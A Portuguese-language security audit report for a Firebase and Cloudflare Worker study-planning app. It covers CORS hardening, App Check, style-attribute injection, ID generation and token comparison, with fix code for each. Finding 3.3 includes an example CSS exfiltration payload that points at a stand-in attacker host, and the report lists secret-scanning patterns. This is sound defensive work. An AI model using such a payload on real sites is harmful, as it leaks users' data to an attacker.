# Relatório de Auditoria de Segurança — estudo-organizado

> Data: 2026-06-07 · Escopo: codebase completa (foco em vazamento de segredos e
> vulnerabilidades de aplicação). Este documento é **somente referência** — nenhuma
> mudança de código de runtime foi aplicada nesta entrega.

## 1. Resumo executivo

A postura de segurança do projeto é **boa**. **Não há segredos sensíveis vazados**, o
histórico do git está limpo, as regras do Firestore são sólidas e existem mecanismos
defensivos relevantes (CSP, isolamento de credenciais, validação de backup).

Os achados abaixo são, em sua maioria, **endurecimento (hardening)** e não falhas
exploráveis remotamente. Os dois itens de maior prioridade são:

1. Endurecer o CORS do Cloudflare Worker (falhar fechado).
2. Ativar o **Firebase App Check** e restringir a API key no console (configuração
   externa, não código).

| Severidade | Qtd. | Itens |
|------------|------|-------|
| Crítico    | 0    | — |
| Médio      | 2    | CORS fail-open no worker; App Check desligado (externo) |
| Baixo      | 3    | XSS via atributo `style`; `Math.random()` em `uid()`; comparação de token não constant-time |
| Informativo| 1    | Uso difuso de `innerHTML` |

> **Nota sobre "vazamento de chaves":** a única configuração com valores reais no
> repositório é o config web do Firebase (`firebase-runtime-config.js`). **Chaves de API
> web do Firebase são públicas por design** — elas identificam o projeto, não autenticam.
> Não constituem um segredo vazado. O controle de segurança real são as `firestore.rules`
> (presentes e corretas) + App Check (a ativar). Ver item 3.2.

## 2. Pontos positivos (manter)

- **`firestore.rules`** — escopo por usuário (`owns(uid)`), validação estrita de schema
  (`validSnapshot`, `validEntityDoc`), identidade imutável em updates e
  `match /{document=**} { allow read, write: if false }` (deny-by-default). Sólido.
- **`src/js/credentials.js`** — tokens (Cloudflare/Drive) armazenados em um IndexedDB
  separado (`EstudoCredenciaisDB`), isolados do estado exportável; falha explícita se
  IndexedDB indisponível, evitando fallback inseguro para `localStorage`.
- **`src/js/backup-restore.js`** (`validateBackupPayload`) — bloqueia exfiltração de
  tokens (Cloudflare/Drive) via backup/exportação.
- **`src/index.html`** — Content Security Policy presente, com `script-src 'self'` (sem
  `unsafe-inline`), impedindo execução de JavaScript injetado.
- **`.gitignore`** — cobre `.env`, `.env.local` e `firebase-config.js`.
- **Histórico do git limpo** — 84 commits; nenhum `.env`, chave privada (`BEGIN PRIVATE
  KEY`), ou token de provedor (`sk-`, `ghp_`, `AKIA`) commitado ou deletado. Tokens
  encontrados em `tests/` são mocks (`test-token`, `e2e-token`, etc.), apropriados.
- **Dependências recentes** (firebase 12.x, eslint 9, vitest 3) — sem versões
  notoriamente vulneráveis.

## 3. Achados detalhados e correções sugeridas

### 3.1 [MÉDIO] CORS abre para qualquer origem quando `ALLOWED_ORIGINS` não está setado
**Arquivo:** `scripts/cloudflare-worker.js:24-26`

```js
if (allowedOrigins.length === 0) {
    return { allowed: true, allowOrigin: origin || '*' };  // reflete qualquer Origin
}
```

Se a variável de ambiente `ALLOWED_ORIGINS` não for configurada (a lista hardcoded no
topo do arquivo está vazia), o worker reflete qualquer `Origin` recebido. É **mitigado**
pelo fato de `AUTH_TOKEN` continuar sendo exigido (linha 98) — não há exposição direta de
dados —, mas é defesa-em-profundidade fraca e contraria o propósito do allowlist.

**Correção — falhar fechado:** quando não houver origens configuradas, **negar** em vez
de refletir `*`, e documentar que `ALLOWED_ORIGINS` é obrigatória.

```js
function resolveOriginPolicy(request, env) {
    const origin = request.headers.get('Origin') || '';
    const allowedOrigins = getAllowedOrigins(env);
    if (allowedOrigins.length === 0) {
        // Sem allowlist configurada → negar (fail-closed). Configure ALLOWED_ORIGINS.
        return { allowed: false, allowOrigin: 'null' };
    }
    if (!origin) {
        return { allowed: true, allowOrigin: allowedOrigins[0] };
    }
    const allowed = allowedOrigins.includes(origin);
    return { allowed, allowOrigin: allowed ? origin : allowedOrigins[0] };
}
```

### 3.2 [MÉDIO · externo] Firebase App Check não está aplicado
**Arquivos:** `src/js/firebase/firebase-runtime-config.js:10`,
`src/js/firebase/firebase-config-default.js:10`

```js
window.ESTUDO_APP_CHECK_SITE_KEY = '';   // vazio → App Check desligado
```

O config Firebase versionado (`firebase-runtime-config.js`) contém valores reais do
projeto (`apiKey`, `projectId`, `appId`, etc.). Como observado no resumo, **a apiKey web
não é um segredo** — o risco real é o **App Check estar desligado**, deixando o projeto
mais exposto a abuso de quota e criação de contas. A defesa primária continua sendo as
`firestore.rules` (auth + ownership).

**Correção — configuração no console (não código):**

- [ ] Ativar **Firebase App Check** (provedor reCAPTCHA v3) e preencher
      `ESTUDO_APP_CHECK_SITE_KEY` (runtime) / `FIREBASE_APP_CHECK_SITE_KEY`.
- [ ] No **Google Cloud Console → APIs & Services → Credentials**, restringir a API key
      por **HTTP referrer** (domínios do app) e limitar às APIs efetivamente usadas
      (Identity Toolkit, Firestore, Token Service).
- [ ] Habilitar **enforcement** do App Check no Firestore após validar em produção.

**Tratamento do arquivo versionado (opcional, não obrigatório):**

- *Recomendado:* **manter e endurecer** — aceitar a apiKey web como pública e focar em
  App Check + restrição por referrer.
- *Alternativa A:* mover `firebase-runtime-config.js` para o mecanismo já existente
  (`firebase-config.js` no `.gitignore`) e injetar em runtime, por consistência.
- *Alternativa B (conservadora):* rotacionar a apiKey no console e substituí-la — não
  necessária para chaves web, mas possível se preferir.

### 3.3 [BAIXO] XSS via atributos `style` não escapados
**Arquivos:**
- `src/js/planejamento/step-renderers.js:325` — `style="width:${pct}%; background:${c.color};"`
  (`c.color` deriva de `edital.cor`, editável pelo usuário)
- `src/js/views/editais-view.js:273` — `style="color:${chColor};${decor}"`

Valores de cor são interpolados em atributos `style` **sem escapar**. A CSP
(`script-src 'self'`) **impede execução de JavaScript**, mas `style-src 'unsafe-inline'`
combinado com `img-src https:` permite, em teoria, injeção de CSS (ex.:
`background-image: url(https://attacker/?…)`). Como os dados são autorais (o próprio
usuário sobre seus próprios dados), o risco prático é baixo — mas a higiene de saída
deveria ser consistente com o resto do código, que já usa `esc()`.

**Correção — aplicar via API do DOM (não interpreta markup) ou validar com allowlist:**

```js
// Em vez de interpolar no template string:
const safeColor = /^(#[0-9a-f]{3,8}|rgb\([\d ,.%]+\)|[a-z]+|var\(--[\w-]+\))$/i
    .test(c.color) ? c.color : 'var(--accent)';
// ...e usar safeColor no template; ou, preferível, atribuir via propriedade:
barFill.style.background = c.color;   // o navegador ignora valores inválidos
```

### 3.4 [BAIXO · informativo] `Math.random()` em `uid()`
**Arquivo:** `src/js/utils.js:9-11`

```js
export function uid() {
  return Date.now().toString(36) + Math.random().toString(36).substring(2, 9);
}
```

`uid()` é usado apenas para **IDs de entidades locais** (editais, eventos, sessões),
**não** para tokens de segurança — portanto **não é vulnerabilidade**. Opcionalmente,
para robustez contra colisões:

```js
export function uid() {
  if (globalThis.crypto?.randomUUID) return crypto.randomUUID();
  return Date.now().toString(36) + Math.random().toString(36).substring(2, 9);
}
```

### 3.5 [BAIXO] Comparação de `AUTH_TOKEN` não é constant-time
**Arquivo:** `scripts/cloudflare-worker.js:98`

```js
if (!authHeader || authHeader !== `Bearer ${env.AUTH_TOKEN}`) { ... }
```

A comparação `!==` é teoricamente sujeita a timing attack. O risco prático na borda da
Cloudflare é muito baixo. Endurecimento opcional: comparar via digest de tamanho fixo
(ex.: `crypto.subtle.digest` de ambos os lados e comparar os bytes) para remover a
dependência de tempo do conteúdo.

### 3.6 [INFORMATIVO] Uso difuso de `innerHTML`
Diversos renderizadores usam `innerHTML` com template strings. A maioria já passa pelos
dados por `esc()` e a CSP bloqueia execução de scripts injetados. Recomendação de longo
prazo: centralizar um helper de render seguro (ou adotar `textContent`/`createElement`
nos pontos com dados variáveis) para evitar regressões quando alguém esquecer o `esc()`.

## 4. Prevenção (recomendações de processo)

- [ ] Adicionar varredura de segredos no fluxo de commit/CI — ex.:
      [`gitleaks`](https://github.com/gitleaks/gitleaks) ou
      [`detect-secrets`](https://github.com/Yelp/detect-secrets) como hook de pre-commit.
- [ ] Manter `firestore.rules` cobertas por testes (já há
      `tests/unit/firestore-contracts.test.js`) ao evoluir o schema.
- [ ] Documentar `ALLOWED_ORIGINS` e `AUTH_TOKEN` como variáveis obrigatórias do worker.

## 5. Apêndice — verificações negativas (não encontrado)

Nenhum dos seguintes foi encontrado no working tree nem no histórico do git:
`.env`/`.env.local`/`.env.production` commitado · chaves privadas (`BEGIN PRIVATE KEY`,
`BEGIN RSA`) · arquivos `.pem`/`.key`/`.pfx`/`.p12` · strings de conexão de banco com
credenciais · chaves AWS (`AKIA…`) · tokens GitHub (`ghp_…`) · chaves OpenAI (`sk-…`) ·
credenciais de Supabase/Auth0/Okta.
